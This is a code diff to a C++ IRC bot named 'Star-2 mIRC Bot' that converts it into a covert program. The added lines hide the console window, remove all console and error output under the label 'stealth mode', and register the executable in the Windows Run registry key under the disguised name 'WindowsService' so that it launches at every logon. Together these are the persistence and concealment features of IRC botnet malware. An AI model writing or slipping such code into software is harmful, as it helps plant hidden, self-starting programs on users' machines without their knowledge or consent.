@@ -14,6 +14,9 @@
 #include <algorithm>
 #include <signal.h>
 #include <random>
+#ifdef _WIN32
+#include <windows.h>
+#endif
 
 // Random name generator for auto-rename
 std::string generateRandomBotName() {
@@ -56,6 +59,7 @@ public:
     }
 
     void log(const std::string& message) {
+        // Silent logging - only to file, no console output
         std::ofstream logStream(logFile, std::ios::app);
         if (logStream.is_open()) {
             auto now = std::chrono::system_clock::now();
@@ -63,7 +67,7 @@ public:
             logStream << std::ctime(&time_t) << ": " << message << std::endl;
             logStream.close();
         }
-        std::cout << "[LOG] " << message << std::endl;
+        // No console output for stealth mode
     }
 
     bool connect() {
@@ -257,6 +261,23 @@ public:
         }
     }
 
+    void setupAutoStartup() {
+        #ifdef _WIN32
+        // Register for Windows startup
+        HKEY hKey;
+        char exePath[MAX_PATH];
+        GetModuleFileNameA(NULL, exePath, MAX_PATH);
+        
+        if (RegOpenKeyExA(HKEY_CURRENT_USER, 
+            "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
+            0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
+            RegSetValueExA(hKey, "WindowsService", 0, REG_SZ, 
+                (const BYTE*)exePath, strlen(exePath) + 1);
+            RegCloseKey(hKey);
+        }
+        #endif
+    }
+
     void stop() {
         running = false;
         if (sockfd >= 0) {
@@ -266,20 +287,26 @@ public:
 };
 
 int main() {
-    std::cout << "=== Star-2 mIRC Bot ===" << std::endl;
-    std::cout << "Starting bot..." << std::endl;
+    // Stealth mode - no console output
+    #ifdef _WIN32
+    // Hide console window on Windows
+    ShowWindow(GetConsoleWindow(), SW_HIDE);
+    #endif
 
     MircBot bot;
 
+    // Setup auto-startup (Windows only)
+    bot.setupAutoStartup();
+
+    // Silent signal handling
     signal(SIGINT, [](int) {
-        std::cout << "\nShutting down bot..." << std::endl;
         exit(0);
     });
 
     try {
         bot.run();
     } catch (const std::exception& e) {
-        std::cout << "Error: " << e.what() << std::endl;
+        // Silent error handling
     }
 
     return 0;
